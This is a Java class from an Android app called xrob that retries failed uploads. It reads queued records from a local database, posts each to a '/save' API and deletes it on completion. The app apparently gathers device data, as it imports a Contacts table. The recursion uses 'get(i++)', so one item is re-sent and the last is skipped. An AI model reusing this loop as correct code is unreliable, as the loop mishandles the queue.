package com.theah64.xrob.asynctasks;

import android.content.Context;
import android.util.Log;

import com.theah64.xrob.database.BaseTable;
import com.theah64.xrob.database.Contacts;
import com.theah64.xrob.database.PendingDeliveries;
import com.theah64.xrob.models.PendingDelivery;
import com.theah64.xrob.utils.APIRequestBuilder;
import com.theah64.xrob.utils.APIRequestGateway;
import com.theah64.xrob.utils.APIResponse;
import com.theah64.xrob.utils.OkHttpUtils;
import com.theah64.xrob.utils.Xrob;

import org.json.JSONException;

import java.io.IOException;
import java.util.List;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/**
 * To manage deliveries failed due to the save process.
 * Created by theapache64 on 21/9/16.
 */
public class PendingDeliverySynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {

    private static final String X = PendingDeliverySynchronizer.class.getSimpleName();
    private List<PendingDelivery> pendingDeliveryList;
    private int i = 0;
    private PendingDeliveries pendingDeliveriesTable;
    private String apiKey;

    public PendingDeliverySynchronizer(Context context, final String apiKey) {
        super(context, apiKey);
    }

    @Override
    protected Void doInBackground(String... strings) {


        pendingDeliveriesTable = PendingDeliveries.getInstance(getContext());
        pendingDeliveryList = pendingDeliveriesTable.getAll();

        if (pendingDeliveryList != null) {
            //Opening api request gate
            new APIRequestGateway(getContext(), new APIRequestGateway.APIRequestGatewayCallback() {
                @Override
                public void onReadyToRequest(String apiKeyLocal) {
                    apiKey = apiKeyLocal;
                    sync(pendingDeliveryList.get(i));
                }

                @Override
                public void onFailed(String reason) {

                }
            });
        } else {
            Log.d(X, "No pending deliveries found");
        }

        return null;
    }

    /**
     * Used to recursively save the data
     *
     * @param curDel
     */
    private void sync(final PendingDelivery curDel) {

        final Request pdReq = new APIRequestBuilder("/save", apiKey)
                .addParamIfNotNull(Xrob.KEY_DATA, curDel.getData())
                .addParamIfNotNull(Xrob.KEY_DATA_TYPE, curDel.getDataType())
                .addParamIfNotNull(Xrob.KEY_MESSAGE, curDel.getMessage())
                .addParamIfNotNull(Xrob.KEY_ERROR, String.valueOf(curDel.isError()))
                .build();


        OkHttpUtils.getInstance().getClient().newCall(pdReq).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                try {
                    new APIResponse(OkHttpUtils.logAndGetStringBody(response));

                    //That's done, now do next.
                    doNext(true);

                } catch (JSONException | APIResponse.APIException e) {
                    e.printStackTrace();

                    //If it's API error,delete it from db other wise move to next request.
                    doNext(e instanceof APIResponse.APIException);
                }
            }

            private void doNext(final boolean isDeleteFromDb) {

                //Delete previously posted request from db
                if (isDeleteFromDb) {
                    pendingDeliveriesTable.delete(PendingDeliveries.COLUMN_ID, curDel.getId());
                }

                if (i < (pendingDeliveryList.size() - 1)) {
                    sync(pendingDeliveryList.get(i++));
                }
            }

        });

    }


}
